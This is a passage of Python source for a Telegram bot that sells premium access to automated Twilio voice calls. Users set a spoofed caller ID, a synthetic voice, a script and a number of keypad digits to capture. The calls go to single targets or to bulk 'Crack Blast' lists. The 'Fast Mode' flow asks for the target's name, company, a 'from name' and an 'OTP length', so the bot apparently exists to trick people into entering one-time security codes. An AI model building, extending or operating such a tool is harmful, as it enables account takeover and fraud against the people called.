            for name, content in DEFAULT_SCRIPT_LIBRARY:
                conn.execute("INSERT OR IGNORE INTO scripts (user_id, name, content) VALUES (?, ?, ?)", ("0", name, content))
            conn.commit()
        rows = conn.execute(
            "SELECT id, user_id, name, content FROM scripts WHERE user_id = ? OR user_id = '0' ORDER BY CASE WHEN user_id = '0' THEN 0 ELSE 1 END, created_at ASC, id ASC",
            (user_id_str,),
        ).fetchall()
        conn.close()
        return [{"id": row[0], "user_id": row[1], "name": row[2] or "Untitled Script", "content": row[3]} for row in rows]
    except Exception:
        return []

def db_get_scripts(user_id_str: str) -> List[str]:
    return [row["content"] for row in db_get_script_rows(user_id_str)]


def db_save_script_rows(user_id_str: str, rows: List[Dict[str, Any]]) -> bool:
    """Persist script rows for a user, preserving the shared default library rows."""
    init_user_db(user_id_str)
    db_path = get_db_path(user_id_str)
    try:
        conn = sqlite3.connect(db_path)
        conn.execute("DELETE FROM scripts WHERE user_id = ?", (user_id_str,))
        for row in rows:
            if not isinstance(row, dict):
                continue
            name = str(row.get("name") or "Untitled Script").strip() or "Untitled Script"
            content = str(row.get("content") or "").strip()
            user_id = str(row.get("user_id") or user_id_str)
            created_at = row.get("created_at") or datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            updated_at = row.get("updated_at") or created_at
            conn.execute(
                "INSERT INTO scripts (user_id, name, content, created_at, updated_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, name, content, created_at, updated_at),
            )
        conn.commit()
        conn.close()
        logger.info(f"Scripts rows saved for user {user_id_str}")
        return True
    except Exception as e:
        logger.error(f"DB save rows error: {e}")
        return False

# ======================================================================
# TEXT MESSAGE HANDLER (state machine with feedback)
# ======================================================================
@bot.message_handler(
    func=lambda message: (
        get_user_state(str(message.from_user.id)) != ""
        and bool(getattr(message, "text", None))
        and not (
            str(getattr(message, "text", "")).strip().startswith("/")
            and str(getattr(message, "text", "")).strip().lower() != "/skip"
        )
    )
)
def handle_stateful_text(message):
    user_id_str = str(message.from_user.id)
    state = get_user_state(user_id_str)
    text = (message.text or "").strip()

    # Normal call steps (delegated to handlers/call_flow.py)
    import threading
    import handlers.call_flow as cf
    cf.init_bot(bot)
    handled = cf.handle_normal_step(message.chat.id, user_id_str, state, text)
    if handled is not None:
        return

    if state == "manual_call_step_1_phone":
        # Guard: prevent non-premium users from progressing through manual calling wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. MANUAL CALLING is available only to premium subscribers. Visit /start > SHOP to upgrade.")
            return
        phone = normalize_phone_number(text)
        if not is_valid_e164(phone):
            bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
            return
        write_user_file(user_id_str, "manual_phonenum.txt", phone)
        set_user_state(user_id_str, "manual_call_step_2_callerid")
        bot.send_message(message.chat.id, "💠 Step 2/8: Caller ID\nEnter the caller ID number to display, or send /skip to use the default.\nExample: +1234567890")
        return

    if state == "manual_call_step_2_callerid":
        caller_input = text.strip()
        if caller_input.lower() in ("skip", "/skip", ""):
            caller = TWILIO_PHONE_NUMBER
        else:
            caller = normalize_phone_number(caller_input)
            if not is_valid_e164(caller):
                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip")
                return
        write_user_file(user_id_str, "manual_caller_id.txt", caller)
        set_user_state(user_id_str, "manual_call_step_3_script_choice")
        buttons = types.InlineKeyboardMarkup(row_width=1)
        buttons.add(types.InlineKeyboardButton("✍️ Paste custom script", callback_data="manual_script_paste"))
        buttons.add(types.InlineKeyboardButton("📚 Select saved script", callback_data="manual_script_library"))
        buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
        bot.send_message(message.chat.id, "💠 Step 3/8: Script\nChoose whether to paste a new script or select one from your library.", reply_markup=buttons)
        return

    if state == "manual_call_step_3_script_input":
        if not text:
            bot.send_message(message.chat.id, "❌ Script cannot be empty.")
            return
        write_user_file(user_id_str, "manual_script.txt", text)
        set_user_state(user_id_str, "manual_call_step_4_voice")
        bot.send_message(message.chat.id, "🎤 Step 4/8: Voice Selection\nChoose a voice from the list or send the voice number/name.")
        try:
            from menu_utils import build_voice_selection_keyboard
            keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
            bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
        except Exception:
            bot.send_message(message.chat.id, "Send the voice number or name now.")
        return

    if state == "manual_call_step_4_voice":
        _, voice_id, voice_name = resolve_voice_choice(text)
        if not voice_id:
            bot.send_message(message.chat.id, "❌ Voice not recognized. Reply with number or full name.")
            try:
                from menu_utils import build_voice_selection_keyboard
                keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
                bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
            except Exception:
                pass
            return
        write_user_file(user_id_str, "manual_voice_id.txt", voice_id)
        write_user_file(user_id_str, "manual_voice_name.txt", voice_name)
        set_user_state(user_id_str, "manual_call_step_5_digits")
        bot.send_message(message.chat.id, "💠 Step 5/8: DTMF Capture\nHow many digits should the bot collect? Reply 0 for none.")
        return

    if state == "manual_call_step_5_digits":
        if not text.isdigit() or int(text) < 0 or int(text) > 10:
            bot.send_message(message.chat.id, "❌ Enter a digit count between 0 and 10.")
            return
        write_user_file(user_id_str, "manual_digits.txt", text)
        set_user_state(user_id_str, "manual_call_step_6_delay")
        bot.send_message(message.chat.id, "💠 Step 6/8: Delay Before Speaking\nEnter delay in seconds (0-10).")
        return

    if state == "manual_call_step_6_delay":
        if not text.isdigit() or int(text) < 0 or int(text) > 15:
            bot.send_message(message.chat.id, "❌ Enter a number between 0 and 15.")
            return
        write_user_file(user_id_str, "manual_delay.txt", text)
        set_user_state(user_id_str, "manual_call_step_7_fallback")
        bot.send_message(message.chat.id, "💠 Step 7/8: Fallback Message\nEnter a fallback message that will play if no input is received, or send NONE.")
        return

    if state == "manual_call_step_7_fallback":
        fallback_text = text.strip()
        if fallback_text.lower() == "none":
            fallback_text = ""
        write_user_file(user_id_str, "manual_fallback.txt", fallback_text)
        clear_user_state(user_id_str)
        send_manual_call_ready_panel(message.chat.id, user_id_str)
        return

    if state == "manual_call_schedule":
        parts = [p.strip() for p in text.split(",")]
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Format: +1234567890,DD/MM/YYYY,HH:MM")
            return
        phone, date_str, time_str = parts
        try:
            scheduled_time = datetime.strptime(f"{date_str} {time_str}", "%d/%m/%Y %H:%M")
            if scheduled_time < datetime.now():
                bot.send_message(message.chat.id, "❌ Time must be in the future.")
                return
            manual_params = {
                "script": read_user_file(user_id_str, "manual_script.txt", ""),
                "voice_id": read_user_file(user_id_str, "manual_voice_id.txt", get_default_voice_id()),
                "caller_id": read_user_file(user_id_str, "manual_caller_id.txt", TWILIO_PHONE_NUMBER),
                "delay": read_user_file(user_id_str, "manual_delay.txt", "0"),
                "fallback": read_user_file(user_id_str, "manual_fallback.txt", ""),
                "digits": read_user_file(user_id_str, "manual_digits.txt", "0"),
            }
            if not manual_params["script"]:
                bot.send_message(message.chat.id, "❌ No manual script configured. Please complete the manual setup first.")
                return
            if schedule_manual_call(user_id_str, phone, scheduled_time, manual_params, chat_id=message.chat.id):
                bot.send_message(message.chat.id, f"✅ Manual call scheduled for {scheduled_time.strftime('%d/%m/%Y %H:%M')}")
                clear_user_state(user_id_str)
            else:
                bot.send_message(message.chat.id, "❌ Schedule failed.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
        return

    if state == "custom_call_step_2_script_input":
        # Guard: prevent non-premium users from progressing through custom call wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CUSTOM CALL is available only to premium subscribers. Visit /start > SHOP to upgrade.")
            return
        if not text:
            bot.send_message(message.chat.id, "❌ Message cannot be empty.")
            return
        write_user_file(user_id_str, "custom_script.txt", text)
        set_user_state(user_id_str, "custom_call_step_3_phone")
        bot.send_message(message.chat.id, "📞 Step 2/8: Target Phone Number\nEnter the target phone number with country code (e.g. +1234567890).")
        return

    if state == "custom_call_step_3_phone":
        phone = normalize_phone_number(text)
        if not is_valid_e164(phone):
            bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
            return
        write_user_file(user_id_str, "custom_phonenum.txt", phone)
        set_user_state(user_id_str, "custom_call_step_4_callerid")
        bot.send_message(message.chat.id, "💠 Step 3/8: Caller ID\nEnter the caller ID number to display, or send /skip to use the default. Example: +1234567890")
        return

    if state == "custom_call_step_4_callerid":
        caller_input = text.strip()
        if caller_input.lower() in ("skip", "/skip", ""):
            caller = TWILIO_PHONE_NUMBER
        else:
            caller = normalize_phone_number(caller_input)
            if not is_valid_e164(caller):
                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip")
                return
        write_user_file(user_id_str, "custom_caller_id.txt", caller)
        set_user_state(user_id_str, "custom_call_step_5_voice")
        bot.send_message(message.chat.id, "🎤 Step 4/8: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
        try:
            from menu_utils import build_voice_selection_keyboard
            keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
            bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
        except Exception:
            bot.send_message(message.chat.id, "Send the voice number or name now.")
        return

    if state == "custom_call_step_5_voice":
        choice = text.strip()
        voice_id = None
        voice_name = None
        if choice in VOICE_MAPPING:
            voice_id = VOICE_MAPPING[choice]["id"]
            voice_name = VOICE_MAPPING[choice]["name"]
        else:
            for _, voice_data in VOICE_MAPPING.items():
                if voice_data["name"].lower() == choice.lower():
                    voice_id = voice_data["id"]
                    voice_name = voice_data["name"]
                    break
        if not voice_id:
            bot.send_message(message.chat.id, "❌ Voice not recognized. Reply with number or full name.")
            return
        write_user_file(user_id_str, "custom_voice_id.txt", voice_id)
        write_user_file(user_id_str, "custom_voice_name.txt", voice_name)
        set_user_state(user_id_str, "custom_call_step_6_digits")
        bot.send_message(message.chat.id, "💠 Step 5/8: DTMF Capture\nHow many digits should the bot collect? Reply 0 for none.")
        return

    if state == "custom_call_step_6_digits":
        if not text.isdigit() or int(text) < 0 or int(text) > 10:
            bot.send_message(message.chat.id, "❌ Enter a digit count between 0 and 10.")
            return
        write_user_file(user_id_str, "custom_digits.txt", text)
        set_user_state(user_id_str, "custom_call_step_7_delay")
        bot.send_message(message.chat.id, "💠 Step 6/8: Delay Before Speaking\nEnter delay in seconds (0-10).")
        return

    if state == "custom_call_step_7_delay":
        if not text.isdigit() or int(text) < 0 or int(text) > 15:
            bot.send_message(message.chat.id, "❌ Enter a number between 0 and 15.")
            return
        write_user_file(user_id_str, "custom_delay.txt", text)
        set_user_state(user_id_str, "custom_call_step_8_fallback")
        bot.send_message(message.chat.id, "💠 Step 7/8: Fallback Message\nEnter a fallback message that will play if no input is received, or send NONE.")
        return

    if state == "custom_call_step_8_fallback":
        fallback_text = text.strip()
        if fallback_text.lower() == "none":
            fallback_text = ""
        write_user_file(user_id_str, "custom_fallback.txt", fallback_text)
        clear_user_state(user_id_str)
        send_custom_call_ready_panel(message.chat.id, user_id_str)
        return

    if isinstance(state, str) and state.startswith("crack_blast_step_"):
        show_under_development_notice(message.chat.id, None, "Crack Blast")
        clear_user_state(user_id_str)
        return

    if state == "custom_call_schedule":
        parts = [p.strip() for p in text.split(",")]
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Format: +1234567890,DD/MM/YYYY,HH:MM")
            return
        phone, date_str, time_str = parts
        try:
            scheduled_time = datetime.strptime(f"{date_str} {time_str}", "%d/%m/%Y %H:%M")
            if scheduled_time < datetime.now():
                bot.send_message(message.chat.id, "❌ Time must be in the future.")
                return
            custom_params = {
                "script": read_user_file(user_id_str, "custom_script.txt", ""),
                "voice_id": read_user_file(user_id_str, "custom_voice_id.txt", get_default_voice_id()),
                "caller_id": read_user_file(user_id_str, "custom_caller_id.txt", TWILIO_PHONE_NUMBER),
                "delay": read_user_file(user_id_str, "custom_delay.txt", "0"),
                "fallback": read_user_file(user_id_str, "custom_fallback.txt", ""),
                "digits": read_user_file(user_id_str, "custom_digits.txt", "0"),
            }
            if not custom_params["script"]:
                bot.send_message(message.chat.id, "❌ No custom message configured. Please complete the custom setup first.")
                return
            if schedule_custom_call(user_id_str, phone, scheduled_time, custom_params, chat_id=message.chat.id):
                bot.send_message(message.chat.id, f"✅ Custom call scheduled for {scheduled_time.strftime('%d/%m/%Y %H:%M')}")
                clear_user_state(user_id_str)
            else:
                bot.send_message(message.chat.id, "❌ Schedule failed.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
        return

    if state == "crack_blast_step_1_numbers":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        numbers = normalize_bulk_number_list(text)
        if not numbers:
            bot.send_message(message.chat.id, "❌ No valid phone numbers found. Send numbers with full country code, one per line or comma separated.")
            return
        if len(numbers) > 30:
            bot.send_message(message.chat.id, "❌ Maximum 30 numbers allowed. Please resend a smaller list.")
            return
        save_crackblast_numbers(user_id_str, numbers)
        set_user_state(user_id_str, "crack_blast_step_2_script_choice")
        buttons = types.InlineKeyboardMarkup(row_width=1)
        buttons.add(types.InlineKeyboardButton("✍️ Paste custom script", callback_data="crack_blast_script_paste"))
        buttons.add(types.InlineKeyboardButton("📚 Select saved script", callback_data="crack_blast_script_library"))
        buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="crack_blast_cancel"))
        bot.send_message(message.chat.id, "📋 Step 2/7: Script\nChoose a saved script or paste a custom campaign message now.", reply_markup=buttons)
        return

    if state == "crack_blast_step_2_script_choice":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        if not text:
            bot.send_message(message.chat.id, "❌ Script cannot be empty. Please paste the campaign message or choose a saved script.")
            return
        write_user_file(user_id_str, "crack_script.txt", text)
        set_user_state(user_id_str, "crack_blast_step_3_callerid")
        bot.send_message(message.chat.id, "💠 Step 3/7: Caller ID\nEnter caller ID to display, or send /skip to use the default Twilio number.")
        return

    if state == "crack_blast_step_2_script_input":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        if not text:
            bot.send_message(message.chat.id, "❌ Script cannot be empty.")
            return
        write_user_file(user_id_str, "crack_script.txt", text)
        set_user_state(user_id_str, "crack_blast_step_3_callerid")
        bot.send_message(message.chat.id, "💠 Step 3/7: Caller ID\nEnter caller ID to display, or send /skip to use the default Twilio number.")
        return

    if state == "crack_blast_step_3_callerid":
        caller_input = text.strip()
        if caller_input.lower() in ("skip", "/skip", ""):
            caller = TWILIO_PHONE_NUMBER
        else:
            caller = normalize_phone_number(caller_input)
            if not is_valid_e164(caller):
                bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip.")
                return
        write_user_file(user_id_str, "crack_caller_id.txt", caller)
        set_user_state(user_id_str, "crack_blast_step_4_voice")
        bot.send_message(message.chat.id, "🎤 Step 4/7: Voice Selection\nChoose your voice from the list below or send the voice number/name.")
        try:
            from menu_utils import build_voice_selection_keyboard
            keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
            bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
        except Exception:
            bot.send_message(message.chat.id, "Send the voice number or name now.")
        return

    if state == "crack_blast_step_4_voice":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        _, voice_id, voice_name = resolve_voice_choice(text)
        if not voice_id:
            bot.send_message(message.chat.id, "❌ Voice not recognized. Reply with number (1-20) or full name.")
            return
        write_user_file(user_id_str, "crack_voice_id.txt", voice_id)
        write_user_file(user_id_str, "crack_voice_name.txt", voice_name)
        set_user_state(user_id_str, "crack_blast_step_5_digits")
        bot.send_message(message.chat.id, "💠 Step 5/7: DTMF digits\nHow many digits should the bot collect? Reply 0 for none.")
        return

    if state == "crack_blast_step_5_digits":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        if not text.isdigit() or int(text) < 0 or int(text) > 10:
            bot.send_message(message.chat.id, "❌ Enter a number between 0 and 10.")
            return
        write_user_file(user_id_str, "crack_digits.txt", text)
        set_user_state(user_id_str, "crack_blast_step_6_delay")
        bot.send_message(message.chat.id, "💠 Step 6/7: Delay Before Speaking\nEnter delay in seconds (0-10).")
        return

    if state == "crack_blast_step_6_delay":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        if not text.isdigit() or int(text) < 0 or int(text) > 15:
            bot.send_message(message.chat.id, "❌ Enter a number between 0 and 15.")
            return
        write_user_file(user_id_str, "crack_delay.txt", text)
        set_user_state(user_id_str, "crack_blast_step_7_fallback")
        bot.send_message(message.chat.id, "💠 Step 7/7: Fallback Message\nEnter a fallback message that will play if no input is received, or send NONE.")
        return

    if state == "crack_blast_step_7_fallback":
        # Guard: prevent non-premium users from progressing through crack blast wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. CRACK BLAST is reserved for premium subscribers. Visit /start > SHOP to upgrade.")
            return
        fallback_text = text.strip()
        if fallback_text.lower() == "none":
            fallback_text = ""
        write_user_file(user_id_str, "crack_fallback.txt", fallback_text)
        clear_user_state(user_id_str)
        send_crack_blast_review_panel(message.chat.id, user_id_str)
        return

    if state == "manual_call_step_3_script_choice":
        bot.send_message(message.chat.id, "❌ Please choose either Paste custom script or Select saved script using the buttons.")
        return

    # Normal call steps 5-9 handled by call_flow via the delegation above

    # Fast mode setup (single-line input)
    if state == "fast_mode_awaiting":
        # Guard: prevent non-premium users from progressing through fast mode wizard
        if not is_premium_user(user_id_str):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, "❌ Premium access required. FAST MODE is available only to premium subscribers. Visit /start > SHOP to upgrade.")
            return
        parts = [p.strip() for p in text.split(",")]
        if len(parts) != 8:
            bot.send_message(
                message.chat.id,
                "❌ Invalid format.\nUse:\nname, company, phone, caller_id, from_name, language, delivery, code_length"
            )
            return

        name, company, phone_raw, caller_raw, from_name, language, delivery, otp_length = parts
        phone_clean = phone_raw.replace(" ", "")
        caller_input = caller_raw.strip()
        caller_clean = caller_raw.replace(" ", "")
        language = language.lower()
        delivery = delivery.lower()

        if not (phone_clean.startswith("+") and len(phone_clean) >= 8):
            bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
            return
        if caller_input.lower() in ("", "skip", "/skip"):
            caller_clean = TWILIO_PHONE_NUMBER  # Use default Twilio number
        elif not (caller_clean.startswith("+") and len(caller_clean) >= 8):
            bot.send_message(message.chat.id, "❌ Invalid caller ID format. Use +1234567890 or skip for default")
            return
        if language not in ("en", "fr"):
            bot.send_message(message.chat.id, "❌ Language must be EN or FR.")
            return
        if delivery not in ("sms", "email"):
            bot.send_message(message.chat.id, "❌ Delivery must be SMS or EMAIL.")
            return
        if not otp_length.isdigit() or not (4 <= int(otp_length) <= 10):
            bot.send_message(message.chat.id, "❌ OTP length must be a number between 4 and 10.")
            return

        write_user_file(user_id_str, "Name.txt", name)
        write_user_file(user_id_str, "Company Name.txt", company)
        write_user_file(user_id_str, "phonenum.txt", phone_clean)
        write_user_file(user_id_str, "Caller ID.txt", caller_clean)
        write_user_file(user_id_str, "From Name.txt", from_name)
        write_user_file(user_id_str, "Language.txt", language)
        write_user_file(user_id_str, "Delivery.txt", delivery)
        write_user_file(user_id_str, "Digits.txt", otp_length)
        clear_user_state(user_id_str)

        summary = f"⚡ Fast call ready:\n{name} @ {company}\nPhone: {phone_clean}"
        buttons = types.InlineKeyboardMarkup()
        buttons = types.InlineKeyboardMarkup(row_width=2)
        buttons.add(types.InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm"))
        buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
        write_user_file(user_id_str, "call_mode_label.txt", "Fast Mode")
        bot.send_message(message.chat.id, summary, reply_markup=buttons)
        return

    # AI Mode phone input
    if state == "ai_mode_awaiting_phone":
        show_under_development_notice(message.chat.id, None, "AI Mode")
        clear_user_state(user_id_str)
        return

    # Custom script creation
    if state == "custom_call_awaiting":
        write_user_file(user_id_str, "custom_script.txt", text)
        set_user_state(user_id_str, "custom_call_awaiting_phone")
        bot.send_message(message.chat.id, f"✅ Script saved! Now enter target phone number:\nExample: +1234567890")
        return

    if state == "custom_call_awaiting_phone":
        phone = text.replace(" ", "")
        if not (phone.startswith("+") and len(phone) >= 8):
            bot.send_message(message.chat.id, "❌ Invalid phone format.")
            return
        write_user_file(user_id_str, "phonenum.txt", phone)
        clear_user_state(user_id_str)
        summary = f"📋 Custom Call Ready:\nPhone: {phone}\nCustom message saved"
        buttons = types.InlineKeyboardMarkup()
        buttons.add(types.InlineKeyboardButton("🟢 INITIATE CUSTOM", callback_data="initiate_custom_call"))
        buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
        buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
        bot.send_message(message.chat.id, summary, reply_markup=buttons)
        return

    # Script creation (when user is in 'creating_script' state)
    if state == "creating_script":
        if not text:
            bot.send_message(message.chat.id, "❌ Script cannot be empty.")
            return
        if len(text) > 1800:
            bot.send_message(message.chat.id, "❌ Script too long (max 1800 chars).")
            return
        parts = [p.strip() for p in text.split("\n\n", 1)]
        if len(parts) == 2 and parts[0] and parts[1]:
            name = parts[0]
            content = parts[1]
        else:
            name = f"My Script {len(db_get_scripts(user_id_str)) + 1}"
            content = text
        if db_add_script(user_id_str, name, content):
            clear_user_state(user_id_str)
            bot.send_message(message.chat.id, f"✅ Script saved!\n\n<b>{html.escape(name)}</b>\n\n<code>{html.escape(content[:180])}</code>", parse_mode="HTML")
        else:
            bot.send_message(message.chat.id, "❌ Failed to save script. Please try again.")
        return

    # Normal call schedule (from professional preview panel)
    if state == "normal_call_schedule":
        clear_user_state(user_id_str)
        bot.send_message(message.chat.id, "❌ Normal Call scheduling moved to the new flow. Use /normal to schedule calls.")
        return

    # Schedule input
    if state == "schedule_input":
        parts = text.split(",")
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Format: +1234567890,DD/MM/YYYY,HH:MM")
            return
        phone, date_str, time_str = parts
        try:
            scheduled_time = datetime.strptime(f"{date_str} {time_str}", "%d/%m/%Y %H:%M")
            if scheduled_time < datetime.now():
                bot.send_message(message.chat.id, "❌ Time must be in the future.")
                return
            if schedule_call(user_id_str, phone, scheduled_time, emotion="neutral"):
                bot.send_message(message.chat.id, f"✅ Scheduled for {scheduled_time.strftime('%d/%m/%Y %H:%M')}")
                clear_user_state(user_id_str)
            else:
                bot.send_message(message.chat.id, "❌ Schedule failed.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
        return

    # Emotion selection
    if state == "emotion_selection":
        emotion_map = {
            "1": "neutral", "2": "cheerful", "3": "angry", "4": "fear", "5": "surprise",
            "neutral": "neutral", "cheerful": "cheerful", "angry": "angry", "fear": "fear", "surprise": "surprise"
        }
        emotion = emotion_map.get(text.strip().lower())
        if not emotion:
            bot.send_message(message.chat.id, "❌ Choose 1-5 or emotion name.")
            return
        write_user_file(user_id_str, "emotion.txt", emotion)
        clear_user_state(user_id_str)
        
        # Start AI Emotion Call directly
        try:
            set_user_state(user_id_str, "waiting_for_emotion_phone")
            bot.send_message(
                message.chat.id,
                f"🧠 Emotion set to: <b>{emotion.upper()}</b>\n\n"
                "Now send the target's phone number to start the call.\n"
                "Format: +1234567890",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Error setting up emotion call: {e}")
            bot.send_message(message.chat.id, "❌ Error setting up emotion call.")
        return
    
    # Get phone number for emotion call
    if state == "waiting_for_emotion_phone":
        phonenum = normalize_phone_number(text.strip())
        if not phonenum or not is_valid_e164(phonenum):
            bot.send_message(message.chat.id, "❌ Invalid phone number. Please use format: +1234567890")
            return
        write_user_file(user_id_str, "phonenum.txt", phonenum)
        clear_user_state(user_id_str)
        
        # Initiate emotion call
        emotion = read_user_file(user_id_str, "emotion.txt", "neutral").strip() or "neutral"
        initiate_emotion_call(message.chat.id, user_id_str, message.from_user, emotion=emotion)
        return

    # Payment proof - text submission
    if state.startswith("awaiting_proof_"):
        verification_id = state.replace("awaiting_proof_", "")
        verification = get_verification_by_id(verification_id)
        
        if not verification:
            bot.send_message(message.chat.id, "❌ Verification session expired. Please try again.")
            clear_user_state(user_id_str)
            return
        
        # Add proof to verification (text type)
        add_proof_to_verification(verification_id, text, "text")
        
        # Notify user
        bot.send_message(
            message.chat.id,
            f"✅ <b>PROOF SUBMITTED</b>\n\n"
            f"Your proof for <b>{verification['plan_name']}</b> ({verification['price']}) has been received.\n\n"
            f"📋 <b>Verification ID:</b> <code>{verification_id}</code>\n\n"
            f"Our admin team will review and approve shortly. You'll receive a confirmation message with your premium access details.",
            parse_mode="HTML"
        )
        
        # Forward to admin/developer
        admin_message = format_verification_for_admin(verification)
        admin_message += f"\n\n📝 <b>PROOF SUBMITTED (TEXT):</b>\n<code>{html.escape(text)}</code>"
        
        if OWNER_ID:
            bot.send_message(OWNER_ID, admin_message, parse_mode="HTML")
        for dev_id in DEVELOPER_IDS:
            bot.send_message(dev_id, admin_message, parse_mode="HTML")
        
        clear_user_state(user_id_str)
        return

    # Premium key entry
    if state == "awaiting_premium_key":
        key_text = text.strip().upper()
        if not key_text:
            bot.send_message(message.chat.id, "❌ Key cannot be empty.")
            return
        success, result = redeem_premium_key(user_id_str, key_text)
        clear_user_state(user_id_str)
        if success:
            bot.send_message(message.chat.id, f"✅ Premium key accepted! Expires: {result}", parse_mode="HTML")
        else:
            bot.send_message(message.chat.id, f"❌ {result}")
        return

    # Admin mass message - Get message content
    if state == "admin_mass_message_input":
        message_text = text.strip()
        if not message_text:
            bot.send_message(message.chat.id, "❌ Message cannot be empty.")
            return
        
        # Get all users from database
        users = get_all_users_with_status()
        if not users:
            bot.send_message(message.chat.id, "ℹ️ No users found in database.")
            clear_user_state(user_id_str)
            return
        
        # Show confirmation before sending
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("✅ SEND", callback_data="confirm_mass_send"))
        keyboard.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_mass_send"))
        
        preview_msg = f"""📢 <b>MASS MESSAGE PREVIEW</b>

Total users: {len(users)}
Premium: {sum(1 for u in users if u['status'] == 'PREMIUM')}
Free: {sum(1 for u in users if u['status'] == 'FREE')}

<b>Message to send:</b>
{message_text}

Confirm sending?"""
        
        set_user_state(user_id_str, "admin_mass_message_confirm")
        write_user_file(user_id_str, "mass_message_text.txt", message_text)
        bot.send_message(message.chat.id, preview_msg, reply_markup=keyboard, parse_mode="HTML")
        return

    # Admin approve premium - step 1: Get user ID
    if state == "admin_approve_premium_step1":
        user_id_to_approve = text.strip()
        if not user_id_to_approve.isdigit():
            bot.send_message(message.chat.id, "❌ Invalid user ID. Please send a valid numeric ID.")
            return
        
        set_user_state(user_id_str, f"admin_approve_premium_step2_{user_id_to_approve}")
        
        # Show duration options
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("1 Day", callback_data=f"admin_approve_1_{user_id_to_approve}"))
        keyboard.add(types.InlineKeyboardButton("3 Days", callback_data=f"admin_approve_3_{user_id_to_approve}"))
        keyboard.add(types.InlineKeyboardButton("7 Days", callback_data=f"admin_approve_7_{user_id_to_approve}"))
        keyboard.add(types.InlineKeyboardButton("30 Days", callback_data=f"admin_approve_30_{user_id_to_approve}"))
        keyboard.add(types.InlineKeyboardButton("90 Days", callback_data=f"admin_approve_90_{user_id_to_approve}"))
        keyboard.add(types.InlineKeyboardButton("Lifetime", callback_data=f"admin_approve_unlimited_{user_id_to_approve}"))
        
        bot.send_message(
            message.chat.id,
            f"👤 User: <code>{user_id_to_approve}</code>\n\n"
            "Step 2: Select subscription duration:",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        clear_user_state(user_id_str)
        return

    # --- Admin custom duration key input ---
    if state == "admin_custom_duration_key":
        try:
            days = int(text.strip())
            if days <= 0 or days > 3650:  # Max 10 years
                bot.send_message(message.chat.id, "❌ Invalid. Enter days between 1-3650.")
                return
            
            # Generate the custom key
            key = {
                "token": secrets.token_urlsafe(16).upper(),
                "days": days,
                "created_by": user_id_str,
                "created_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
                "used": False,
                "type": "CUSTOM_DURATION"
            }
            keys = load_premium_keys()
            keys.append(key)
            save_premium_keys(keys)
            
            bot.send_message(
                message.chat.id,
                f"✅ <b>CUSTOM DURATION KEY GENERATED</b>\n\n"
